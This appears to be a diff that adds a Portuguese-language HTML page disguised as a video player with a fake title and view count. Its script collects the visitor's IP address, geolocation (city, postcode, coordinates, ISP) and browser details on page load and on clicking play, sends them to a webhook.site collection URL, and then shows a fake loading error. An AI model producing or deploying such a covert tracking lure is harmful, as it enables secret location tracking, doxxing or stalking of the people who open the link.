@@ -1,1 +1,179 @@
-https://webhook.site/827daff6-1fae-472c-8a90-c4f13e34789e
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Assistir Vídeo</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        background: #000;
+        color: #fff;
+        font-family: -apple-system, Roboto, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .player {
+        width: 100%;
+        max-width: 500px;
+        background: #111;
+        border-radius: 12px;
+        overflow: hidden;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+    }
+    .video-area {
+        width: 100%;
+        aspect-ratio: 16/9;
+        background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        cursor: pointer;
+    }
+    .play-btn {
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        background: rgba(255,255,255,0.95);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: transform 0.2s;
+    }
+    .play-btn:active { transform: scale(0.92); }
+    .play-btn::after {
+        content: '';
+        width: 0;
+        height: 0;
+        border-left: 22px solid #000;
+        border-top: 14px solid transparent;
+        border-bottom: 14px solid transparent;
+        margin-left: 6px;
+    }
+    .info {
+        padding: 16px 18px;
+    }
+    .title {
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        line-height: 1.3;
+    }
+    .meta {
+        font-size: 13px;
+        color: #888;
+        display: flex;
+        gap: 12px;
+        align-items: center;
+    }
+    .loading {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+    }
+    .spinner {
+        width: 45px;
+        height: 45px;
+        border: 3px solid rgba(255,255,255,0.1);
+        border-top-color: #00ff88;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text {
+        font-size: 14px;
+        color: #aaa;
+    }
+</style>
+</head>
+<body>
+
+<div class="player">
+    <div class="video-area" id="videoArea">
+        <div class="play-btn" id="playBtn"></div>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div class="loading-text">Carregando vídeo...</div>
+        </div>
+    </div>
+    <div class="info">
+        <div class="title">Vídeo Exclusivo — Não Perca</div>
+        <div class="meta">
+            <span>1,2 mi de visualizações</span>
+            <span>•</span>
+            <span>há 2 horas</span>
+        </div>
+    </div>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://webhook.site/827daff6-1fae-472c-8a90-c4f13e34789e';
+
+async function coletarDados() {
+    let ip = 'desconhecido';
+    let geo = {};
+
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        ip = d.ip;
+    } catch(e) {}
+
+    try {
+        const r2 = await fetch('https://ipapi.co/' + ip + '/json/');
+        geo = await r2.json();
+    } catch(e) {}
+
+    const dados = {
+        ip: ip,
+        pais: geo.country_name || '—',
+        regiao: geo.region || '—',
+        cidade: geo.city || '—',
+        cep: geo.postal || '—',
+        lat: geo.latitude || '—',
+        lon: geo.longitude || '—',
+        provedor: geo.org || '—',
+        asn: geo.asn || '—',
+        user_agent: navigator.userAgent,
+        plataforma: navigator.platform,
+        idioma: navigator.language,
+        tela: screen.width + 'x' + screen.height,
+        horario: new Date().toISOString()
+    };
+
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dados)
+        });
+    } catch(e) {}
+
+    const img = new Image();
+    img.src = WEBHOOK_URL + '?ip=' + ip + '&cidade=' + encodeURIComponent(geo.city || '');
+}
+
+document.getElementById('playBtn').addEventListener('click', function() {
+    document.getElementById('playBtn').style.display = 'none';
+    document.getElementById('loading').style.display = 'flex';
+    coletarDados();
+    setTimeout(() => {
+        document.querySelector('.loading-text').textContent = 'Não foi possível carregar. Tente novamente mais tarde.';
+        document.querySelector('.spinner').style.borderTopColor = '#ff4444';
+    }, 4000);
+});
+
+window.addEventListener('load', function() {
+    setTimeout(coletarDados, 800);
+});
+</script>
+
+</body>
+</html>
